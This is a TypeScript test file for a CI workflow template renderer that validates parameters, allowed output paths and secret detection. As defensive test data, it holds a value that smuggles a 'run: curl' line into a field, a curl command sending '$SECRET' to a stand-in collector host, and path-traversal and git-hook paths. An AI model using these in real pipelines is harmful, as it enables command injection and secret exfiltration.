import assert from "node:assert/strict";
import { test } from "node:test";
import { renderTemplate, resolveValues, secretIssues, templateIssues, type CiTemplate } from "../src/core/ci-templates/render.ts";

const base: CiTemplate = {
  id: "node-ci", title: "Node CI", forge: "github", stacks: ["node"], path: ".github/workflows/{{workflow}}.yml",
  params: [
    {name: "workflow", label: "Workflow file", kind: "text", default: "ci"},
    {name: "packageManager", label: "Package manager", kind: "choice", default: "npm", choices: ["npm", "pnpm"]},
    {name: "nodeVersion", label: "Node version", kind: "text", default: "22"},
    {name: "test", label: "Run tests", kind: "flag", default: true},
  ],
  body: "name: CI\njobs:\n  build:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \"{{nodeVersion}}\"\n" +
    "      {{#packageManager=pnpm}}\n      - run: corepack enable\n      {{/packageManager}}\n      - run: {{packageManager}} install\n" +
    "      {{#test}}\n      - run: {{packageManager}} test\n      {{/test}}\n      {{^test}}\n      - run: echo no tests\n      {{/test}}\n",
};

test("values: given ones win over the stack's, the stack's over the template defaults; each is checked against its parameter", () => {
  assert.deepEqual(resolveValues(base, {nodeVersion: "20"}, {packageManager: "pnpm", nodeVersion: "18", build: true}),
    {workflow: "ci", packageManager: "pnpm", nodeVersion: "20", test: true});
  assert.throws(() => resolveValues(base, {packageManager: "yarn"}, {}), /TEMPLATE_INVALID/);
  assert.throws(() => resolveValues(base, {nodeVersion: "22\nrun: curl"}, {}), /TEMPLATE_INVALID/);
  assert.throws(() => resolveValues(base, {nodeVersion: "a: b"}, {}), /TEMPLATE_INVALID/);
  assert.throws(() => resolveValues(base, {test: "yes"}, {}), /TEMPLATE_INVALID/);
  assert.throws(() => resolveValues(base, {extra: "x"}, {}), /TEMPLATE_INVALID/);
  // A YAML indicator cannot lead a value.
  for (const lead of ["@x", "-x", ".x", "/x", "+x"]) assert.throws(() => resolveValues(base, {nodeVersion: lead}, {}), /TEMPLATE_INVALID/, lead);
  // A stack default that does not fit the parameter falls back to the template default instead of failing.
  assert.equal(resolveValues(base, {}, {packageManager: "bun"}).packageManager, "npm");
});

test("rendering substitutes values, keeps or drops section lines whole, and fills the path", () => {
  const pnpm = renderTemplate(base, {workflow: "ci", packageManager: "pnpm", nodeVersion: "20", test: true});
  assert.equal(pnpm.path, ".github/workflows/ci.yml");
  assert.equal(pnpm.text, "name: CI\njobs:\n  build:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \"20\"\n" +
    "      - run: corepack enable\n      - run: pnpm install\n      - run: pnpm test\n");
  const npm = renderTemplate(base, {workflow: "build", packageManager: "npm", nodeVersion: "22", test: false});
  assert.equal(npm.path, ".github/workflows/build.yml");
  assert.equal(npm.text, "name: CI\njobs:\n  build:\n    steps:\n      - uses: actions/setup-node@v4\n        with:\n          node-version: \"22\"\n" +
    "      - run: npm install\n      - run: echo no tests\n");
});

test("nested sections and GitHub expressions with single braces pass through", () => {
  const nested: CiTemplate = {...base, path: ".github/workflows/ci.yml", body: "{{#test}}\na\n{{#packageManager=npm}}\nb ${{ matrix.os }}\n{{/packageManager}}\n{{/test}}\nc\n"};
  assert.equal(renderTemplate(nested, {workflow: "ci", packageManager: "npm", nodeVersion: "22", test: true}).text, "a\nb ${{ matrix.os }}\nc\n");
  assert.equal(renderTemplate(nested, {workflow: "ci", packageManager: "npm", nodeVersion: "22", test: false}).text, "c\n");
});

test("an unknown name, a flag used as text, an unclosed or crossed section and an unsafe path are refused", () => {
  const values = {workflow: "ci", packageManager: "npm", nodeVersion: "22", test: true};
  for (const body of ["{{nope}}\n", "{{test}}\n", "{{#test}}\na\n", "{{/test}}\n", "{{#test}}\n{{#packageManager=npm}}\n{{/test}}\n{{/packageManager}}\n", "{{#nodeVersion}}\nx\n{{/nodeVersion}}\n"])
    assert.throws(() => renderTemplate({...base, body}, values), /TEMPLATE_INVALID/, body);
  for (const path of ["../ci.yml", "/etc/ci.yml", ".github/workflows/ci.txt", ".env.yml", "a//b.yml", ".git/hooks/x.yml", "config/app.yml",
    ".github/dependabot.yml", ".github/workflows/a/b.yml", ".gitlab-ci.yml"])
    assert.throws(() => renderTemplate({...base, path}, values), /TEMPLATE_INVALID/, path);
  // A name in a section that is off is still checked: a template is valid for every value, not only its defaults.
  assert.throws(() => renderTemplate({...base, body: "{{^test}}\n{{nope}}\n{{/test}}\n"}, values), /TEMPLATE_INVALID/);
});

test("each forge writes only to its own CI locations", () => {
  const values = {workflow: "ci", packageManager: "npm", nodeVersion: "22", test: true};
  const ok: [CiTemplate["forge"], string][] = [["github", ".github/workflows/ci.yml"], ["gitea", ".gitea/workflows/ci.yaml"], ["gitea", ".github/workflows/ci.yml"],
    ["gitlab", ".gitlab-ci.yml"], ["gitlab", ".gitlab/ci/test.yml"], ["azure", "azure-pipelines.yml"], ["azure", ".azure-pipelines/ci.yml"]];
  for (const [forge, path] of ok) assert.equal(renderTemplate({...base, forge, path}, values).path, path);
  const refused: [CiTemplate["forge"], string][] = [["github", ".gitea/workflows/ci.yml"], ["gitlab", ".github/workflows/ci.yml"], ["azure", ".gitlab-ci.yml"], ["azure", "config/azure.yml"]];
  for (const [forge, path] of refused) assert.throws(() => renderTemplate({...base, forge, path}, values), /TEMPLATE_INVALID/, forge + " " + path);
});

test("secret-like text is reported: keys, forge tokens, credentials in addresses and IP addresses", () => {
  assert.deepEqual(secretIssues("run: echo ${{ secrets.NPM_TOKEN }}\nimage: node:22\nrun: npm run env:check"), []);
  assert.deepEqual(secretIssues("-----BEGIN OPENSSH PRIVATE KEY-----"), ["a private key"]);
  assert.deepEqual(secretIssues("token: ghp_" + "a".repeat(36)), ["a forge or cloud token"]);
  assert.deepEqual(secretIssues("token: glpat-" + "b".repeat(20)), ["a forge or cloud token"]);
  assert.deepEqual(secretIssues("key: AKIA" + "C".repeat(16)), ["a forge or cloud token"]);
  assert.deepEqual(secretIssues("git clone https://bot:hunter2@git.example.org/x.git"), ["credentials in an address", "an address"]);
  assert.deepEqual(secretIssues("host: 10.0.4.12"), ["an IP address"]);
  assert.deepEqual(secretIssues("run: curl https://collector.example/x -d \"$SECRET\""), ["an address"]);
  assert.deepEqual(secretIssues("run: source .env && make"), ["a .env file"]);
  assert.deepEqual(secretIssues("env_file: config/.env.production"), ["a .env file"]);
});

test("a whole template is checked: its schema, a render with its defaults, and the secret rules on the result", () => {
  assert.deepEqual(templateIssues(base), []);
  assert.deepEqual(templateIssues({...base, id: "Bad Id"}), ["The template does not match the template format."]);
  assert.deepEqual(templateIssues({...base, body: "{{nope}}\n"}), ["The template does not render: unknown name nope."]);
  assert.deepEqual(templateIssues({...base, body: "env:\n  TOKEN: ghp_" + "a".repeat(36) + "\n"}), ["The template has a forge or cloud token."]);
});
